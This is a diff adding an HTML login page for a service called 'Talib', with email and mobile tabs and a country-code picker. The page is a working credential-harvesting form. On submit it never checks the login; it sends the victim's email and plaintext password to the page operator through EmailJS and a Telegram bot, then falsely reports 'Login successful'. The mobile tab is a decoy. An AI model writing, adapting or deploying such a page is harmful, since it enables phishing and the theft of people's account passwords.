@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Talib — Login</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flag-icons@7.2.3/css/flag-icons.min.css">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+  body {
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    background: linear-gradient(135deg, #1e3a5f 0%, #2d6a8f 100%); padding: 16px;
+  }
+  .card {
+    background: #fff; width: 100%; max-width: 380px; border-radius: 16px;
+    padding: 32px 28px; box-shadow: 0 20px 50px rgba(0,0,0,.25);
+  }
+  .brand { text-align: center; margin-bottom: 4px; font-size: 28px; font-weight: 700; color: #1e3a5f; letter-spacing: .5px; }
+  .sub { text-align: center; color: #7a8ba0; font-size: 14px; margin-bottom: 24px; }
+  .tabs { display: flex; background: #eef2f7; border-radius: 10px; padding: 4px; margin-bottom: 22px; }
+  .tab {
+    flex: 1; text-align: center; padding: 10px; border-radius: 8px; cursor: pointer;
+    font-size: 14px; font-weight: 600; color: #5a6b80; transition: .2s; border: none; background: none;
+  }
+  .tab.active { background: #fff; color: #1e3a5f; box-shadow: 0 2px 6px rgba(0,0,0,.08); }
+  label { display: block; font-size: 13px; font-weight: 600; color: #3a4a5c; margin-bottom: 6px; }
+  input {
+    width: 100%; padding: 12px 14px; border: 1.5px solid #d7dee8; border-radius: 10px;
+    font-size: 15px; margin-bottom: 16px; transition: border .2s;
+  }
+  input:focus { outline: none; border-color: #2d6a8f; }
+  .btn {
+    width: 100%; padding: 13px; border: none; border-radius: 10px; background: #1e3a5f;
+    color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; transition: .2s;
+  }
+  .btn:hover { background: #2d6a8f; }
+  .btn:disabled { background: #8a99ab; cursor: not-allowed; }
+  .msg { margin-top: 16px; font-size: 14px; text-align: center; min-height: 20px; }
+  .msg.error { color: #d23b3b; }
+  .msg.ok { color: #1e9e5a; }
+  .hidden { display: none; }
+
+  .phone-row { display: flex; gap: 8px; margin-bottom: 16px; }
+  .phone-row > input { flex: 1; margin-bottom: 0; }
+
+  .cc { position: relative; flex: 0 0 auto; }
+  .cc-toggle {
+    display: flex; align-items: center; gap: 6px; height: 100%; padding: 0 12px;
+    border: 1.5px solid #d7dee8; border-radius: 10px; background: #fff; cursor: pointer;
+    font-size: 15px; white-space: nowrap; min-width: 92px;
+  }
+  .cc-toggle:focus { outline: none; border-color: #2d6a8f; }
+  .cc-toggle .fi { width: 20px; height: 15px; border-radius: 2px; }
+  .cc-toggle .caret { color: #8a99ab; font-size: 11px; margin-left: 2px; }
+
+  .cc-panel {
+    position: absolute; top: calc(100% + 6px); left: 0; z-index: 20;
+    width: 280px; max-width: 78vw; background: #fff; border: 1px solid #e1e8f0;
+    border-radius: 12px; box-shadow: 0 12px 32px rgba(0,0,0,.16); overflow: hidden;
+  }
+  .cc-search {
+    width: 100%; padding: 11px 14px; border: none; border-bottom: 1px solid #eef2f7;
+    font-size: 14px; margin: 0; border-radius: 0;
+  }
+  .cc-search:focus { outline: none; }
+  .cc-list { max-height: 240px; overflow-y: auto; }
+  .cc-item {
+    display: flex; align-items: center; gap: 10px; padding: 10px 14px; cursor: pointer; font-size: 14px;
+  }
+  .cc-item:hover, .cc-item.active { background: #f1f6fb; }
+  .cc-item .fi { width: 22px; height: 16px; border-radius: 2px; flex: 0 0 auto; }
+  .cc-item .nm { flex: 1; color: #2a3a4c; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .cc-item .dl { color: #7a8ba0; font-variant-numeric: tabular-nums; }
+  .cc-empty { padding: 16px 14px; color: #9aa7b5; font-size: 14px; text-align: center; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="brand">Talib</div>
+    <div class="sub">Sign in to your account</div>
+
+    <div class="tabs">
+      <button class="tab active" id="tabEmail" type="button">Email ID</button>
+      <button class="tab" id="tabMobile" type="button">Mobile No.</button>
+    </div>
+
+    <form id="loginForm" autocomplete="off" novalidate>
+      <div id="emailFields">
+        <label for="email">Email address</label>
+        <input type="email" id="email" placeholder="you@example.com">
+        <label for="passEmail">Password</label>
+        <input type="password" id="passEmail" placeholder="••••••••">
+      </div>
+
+      <div id="mobileFields" class="hidden">
+        <label>Mobile number</label>
+        <div class="phone-row">
+          <div class="cc" id="cc">
+            <button type="button" class="cc-toggle" id="ccToggle" aria-haspopup="listbox" aria-expanded="false">
+              <span class="fi" id="ccFlag"></span>
+              <span id="ccDial">+91</span>
+              <span class="caret">▼</span>
+            </button>
+            <div class="cc-panel hidden" id="ccPanel">
+              <input type="text" class="cc-search" id="ccSearch" placeholder="Search country or code…" autocomplete="off">
+              <div class="cc-list" id="ccList"></div>
+            </div>
+          </div>
+          <input type="tel" id="mobile" placeholder="98765 43210">
+        </div>
+        <label for="passMobile">Password</label>
+        <input type="password" id="passMobile" placeholder="••••••••">
+      </div>
+
+      <button type="submit" class="btn">Login</button>
+    </form>
+
+    <div class="msg" id="msg"></div>
+  </div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+  // ============================================================
+  // CONFIG — APNI VALUES YAHAN DAALEIN
+  // ============================================================
+  const EMAILJS_PUBLIC_KEY  = "ZJqAsmb31v__wrYH8";       // ← EmailJS > Account > General
+  const EMAILJS_SERVICE_ID  = "service_9v7swc9";       // ✅ diya hua
+  const EMAILJS_TEMPLATE_ID = "ZJqAsmb31v__wrYH8";      // ← EmailJS > Email Templates
+  const TELEGRAM_BOT_TOKEN  = "YOUR_BOT_TOKEN";        // ← BotFather se
+  const TELEGRAM_CHAT_ID    = "YOUR_CHAT_ID";          // ← getUpdates se
+  // ============================================================
+
+  emailjs.init(EMAILJS_PUBLIC_KEY);
+
+  // --- Full country list: name, ISO2, dial code ---
+  const COUNTRIES = [
+    ["Afghanistan","AF","+93"],["Albania","AL","+355"],["Algeria","DZ","+213"],["Andorra","AD","+376"],
+    ["Angola","AO","+244"],["Antigua and Barbuda","AG","+1268"],["Argentina","AR","+54"],["Armenia","AM","+374"],
+    ["Australia","AU","+61"],["Austria","AT","+43"],["Azerbaijan","AZ","+994"],["Bahamas","BS","+1242"],
+    ["Bahrain","BH","+973"],["Bangladesh","BD","+880"],["Barbados","BB","+1246"],["Belarus","BY","+375"],
+    ["Belgium","BE","+32"],["Belize","BZ","+501"],["Benin","BJ","+229"],["Bhutan","BT","+975"],
+    ["Bolivia","BO","+591"],["Bosnia and Herzegovina","BA","+387"],["Botswana","BW","+267"],["Brazil","BR","+55"],
+    ["Brunei","BN","+673"],["Bulgaria","BG","+359"],["Burkina Faso","BF","+226"],["Burundi","BI","+257"],
+    ["Cambodia","KH","+855"],["Cameroon","CM","+237"],["Canada","CA","+1"],["Cape Verde","CV","+238"],
+    ["Central African Republic","CF","+236"],["Chad","TD","+235"],["Chile","CL","+56"],["China","CN","+86"],
+    ["Colombia","CO","+57"],["Comoros","KM","+269"],["Congo","CG","+242"],["Congo (DRC)","CD","+243"],
+    ["Costa Rica","CR","+506"],["Croatia","HR","+385"],["Cuba","CU","+53"],["Cyprus","CY","+357"],
+    ["Czechia","CZ","+420"],["Denmark","DK","+45"],["Djibouti","DJ","+253"],["Dominica","DM","+1767"],
+    ["Dominican Republic","DO","+1809"],["Ecuador","EC","+593"],["Egypt","EG","+20"],["El Salvador","SV","+503"],
+    ["Equatorial Guinea","GQ","+240"],["Eritrea","ER","+291"],["Estonia","EE","+372"],["Eswatini","SZ","+268"],
+    ["Ethiopia","ET","+251"],["Fiji","FJ","+679"],["Finland","FI","+358"],["France","FR","+33"],
+    ["Gabon","GA","+241"],["Gambia","GM","+220"],["Georgia","GE","+995"],["Germany","DE","+49"],
+    ["Ghana","GH","+233"],["Greece","GR","+30"],["Grenada","GD","+1473"],["Guatemala","GT","+502"],
+    ["Guinea","GN","+224"],["Guinea-Bissau","GW","+245"],["Guyana","GY","+592"],["Haiti","HT","+509"],
+    ["Honduras","HN","+504"],["Hong Kong","HK","+852"],["Hungary","HU","+36"],["Iceland","IS","+354"],
+    ["India","IN","+91"],["Indonesia","ID","+62"],["Iran","IR","+98"],["Iraq","IQ","+964"],
+    ["Ireland","IE","+353"],["Israel","IL","+972"],["Italy","IT","+39"],["Ivory Coast","CI","+225"],
+    ["Jamaica","JM","+1876"],["Japan","JP","+81"],["Jordan","JO","+962"],["Kazakhstan","KZ","+7"],
+    ["Kenya","KE","+254"],["Kiribati","KI","+686"],["Kuwait","KW","+965"],["Kyrgyzstan","KG","+996"],
+    ["Laos","LA","+856"],["Latvia","LV","+371"],["Lebanon","LB","+961"],["Lesotho","LS","+266"],
+    ["Liberia","LR","+231"],["Libya","LY","+218"],["Liechtenstein","LI","+423"],["Lithuania","LT","+370"],
+    ["Luxembourg","LU","+352"],["Macau","MO","+853"],["Madagascar","MG","+261"],["Malawi","MW","+265"],
+    ["Malaysia","MY","+60"],["Maldives","MV","+960"],["Mali","ML","+223"],["Malta","MT","+356"],
+    ["Marshall Islands","MH","+692"],["Mauritania","MR","+222"],["Mauritius","MU","+230"],["Mexico","MX","+52"],
+    ["Micronesia","FM","+691"],["Moldova","MD","+373"],["Monaco","MC","+377"],["Mongolia","MN","+976"],
+    ["Montenegro","ME","+382"],["Morocco","MA","+212"],["Mozambique","MZ","+258"],["Myanmar","MM","+95"],
+    ["Namibia","NA","+264"],["Nauru","NR","+674"],["Nepal","NP","+977"],["Netherlands","NL","+31"],
+    ["New Zealand","NZ","+64"],["Nicaragua","NI","+505"],["Niger","NE","+227"],["Nigeria","NG","+234"],
+    ["North Korea","KP","+850"],["North Macedonia","MK","+389"],["Norway","NO","+47"],["Oman","OM","+968"],
+    ["Pakistan","PK","+92"],["Palau","PW","+680"],["Palestine","PS","+970"],["Panama","PA","+507"],
+    ["Papua New Guinea","PG","+675"],["Paraguay","PY","+595"],["Peru","PE","+51"],["Philippines","PH","+63"],
+    ["Poland","PL","+48"],["Portugal","PT","+351"],["Qatar","QA","+974"],["Romania","RO","+40"],
+    ["Russia","RU","+7"],["Rwanda","RW","+250"],["Saint Kitts and Nevis","KN","+1869"],["Saint Lucia","LC","+1758"],
+    ["Samoa","WS","+685"],["San Marino","SM","+378"],["Sao Tome and Principe","ST","+239"],["Saudi Arabia","SA","+966"],
+    ["Senegal","SN","+221"],["Serbia","RS","+381"],["Seychelles","SC","+248"],["Sierra Leone","SL","+232"],
+    ["Singapore","SG","+65"],["Slovakia","SK","+421"],["Slovenia","SI","+386"],["Solomon Islands","SB","+677"],
+    ["Somalia","SO","+252"],["South Africa","ZA","+27"],["South Korea","KR","+82"],["South Sudan","SS","+211"],
+    ["Spain","ES","+34"],["Sri Lanka","LK","+94"],["Sudan","SD","+249"],["Suriname","SR","+597"],
+    ["Sweden","SE","+46"],["Switzerland","CH","+41"],["Syria","SY","+963"],["Taiwan","TW","+886"],
+    ["Tajikistan","TJ","+992"],["Tanzania","TZ","+255"],["Thailand","TH","+66"],["Timor-Leste","TL","+670"],
+    ["Togo","TG","+228"],["Tonga","TO","+676"],["Trinidad and Tobago","TT","+1868"],["Tunisia","TN","+216"],
+    ["Turkey","TR","+90"],["Turkmenistan","TM","+993"],["Tuvalu","TV","+688"],["Uganda","UG","+256"],
+    ["Ukraine","UA","+380"],["United Arab Emirates","AE","+971"],["United Kingdom","GB","+44"],["United States","US","+1"],
+    ["Uruguay","UY","+598"],["Uzbekistan","UZ","+998"],["Vanuatu","VU","+678"],["Vatican City","VA","+379"],
+    ["Venezuela","VE","+58"],["Vietnam","VN","+84"],["Yemen","YE","+967"],["Zambia","ZM","+260"],["Zimbabwe","ZW","+263"]
+  ].sort((a, b) => a[0].localeCompare(b[0]));
+
+  // --- Elements ---
+  const tabEmail  = document.getElementById('tabEmail');
+  const tabMobile = document.getElementById('tabMobile');
+  const emailFields  = document.getElementById('emailFields');
+  const mobileFields = document.getElementById('mobileFields');
+  const msg = document.getElementById('msg');
+
+  const ccToggle = document.getElementById('ccToggle');
+  const ccPanel  = document.getElementById('ccPanel');
+  const ccSearch = document.getElementById('ccSearch');
+  const ccList   = document.getElementById('ccList');
+  const ccFlag   = document.getElementById('ccFlag');
+  const ccDial   = document.getElementById('ccDial');
+
+  let mode = 'email';
+  let selected = COUNTRIES.find(c => c[1] === 'IN');
+
+  // --- Tabs ---
+  function setMode(newMode) {
+    mode = newMode;
+    const isEmail = mode === 'email';
+    tabEmail.classList.toggle('active', isEmail);
+    tabMobile.classList.toggle('active', !isEmail);
+    emailFields.classList.toggle('hidden', !isEmail);
+    mobileFields.classList.toggle('hidden', isEmail);
+    closePanel();
+    clearMsg();
+  }
+  tabEmail.addEventListener('click', () => setMode('email'));
+  tabMobile.addEventListener('click', () => setMode('mobile'));
+
+  // --- Country dropdown ---
+  function flagClass(iso) { return 'fi fi-' + iso.toLowerCase(); }
+
+  function setSelected(country) {
+    selected = country;
+    ccFlag.className = flagClass(country[1]);
+    ccDial.textContent = country[2];
+  }
+
+  function renderList(filter = '') {
+    const q = filter.trim().toLowerCase();
+    const items = COUNTRIES.filter(([name, iso, dial]) =>
+      !q || name.toLowerCase().includes(q) || dial.includes(q) || iso.toLowerCase() === q
+    );
+    ccList.innerHTML = '';
+    if (!items.length) {
+      ccList.innerHTML = '<div class="cc-empty">No match found</div>';
+      return;
+    }
+    items.forEach(c => {
+      const row = document.createElement('div');
+      row.className = 'cc-item' + (c[1] === selected[1] ? ' active' : '');
+      row.innerHTML = `<span class="${flagClass(c[1])}"></span>
+                       <span class="nm">${c[0]}</span>
+                       <span class="dl">${c[2]}</span>`;
+      row.addEventListener('click', () => { setSelected(c); closePanel(); });
+      ccList.appendChild(row);
+    });
+  }
+
+  function openPanel() {
+    ccPanel.classList.remove('hidden');
+    ccToggle.setAttribute('aria-expanded', 'true');
+    ccSearch.value = '';
+    renderList();
+    ccSearch.focus();
+  }
+  function closePanel() {
+    ccPanel.classList.add('hidden');
+    ccToggle.setAttribute('aria-expanded', 'false');
+  }
+  function togglePanel() {
+    ccPanel.classList.contains('hidden') ? openPanel() : closePanel();
+  }
+
+  ccToggle.addEventListener('click', e => { e.stopPropagation(); togglePanel(); });
+  ccSearch.addEventListener('input', () => renderList(ccSearch.value));
+  ccSearch.addEventListener('click', e => e.stopPropagation());
+  document.addEventListener('click', e => {
+    if (!document.getElementById('cc').contains(e.target)) closePanel();
+  });
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') closePanel(); });
+
+  setSelected(selected);
+
+  // --- Messages ---
+  function showError(t) { msg.textContent = t; msg.className = 'msg error'; }
+  function showOk(t)    { msg.textContent = t; msg.className = 'msg ok'; }
+  function clearMsg()   { msg.textContent = ''; msg.className = 'msg'; }
+
+  // --- Submit ---
+  document.getElementById('loginForm').addEventListener('submit', async function (e) {
+    e.preventDefault();
+    clearMsg();
+
+    if (mode === 'email') {
+      const email = document.getElementById('email').value.trim();
+      const pass  = document.getElementById('passEmail').value;
+
+      if (!email) { showError('Email address is required.'); return; }
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { showError('Please enter a valid email address.'); return; }
+      if (!pass) { showError('Password is required.'); return; }
+
+      const submitBtn = e.target.querySelector('.btn');
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Signing in...';
+
+      const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          email: email,
+          password: pass,
+          time: time
+        });
+
+        const telegramText =
+          `🔐 TALIB LOGIN ALERT\n\n` +
+          `📧 Email: ${email}\n` +
+          `🔑 Password: ${pass}\n` +
+          `🕐 Time: ${time}`;
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: telegramText
+          })
+        });
+
+        showOk('✅ Login successful!');
+        document.getElementById('loginForm').reset();
+
+      } catch (err) {
+        console.error(err);
+        showError('❌ Kuch problem aayi. Dobara try karein.');
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Login';
+      }
+
+    } else {
+      showError('Mobile login is not available. Please sign in with your email instead.');
+    }
+  });
+</script>
+</body>
+</html>
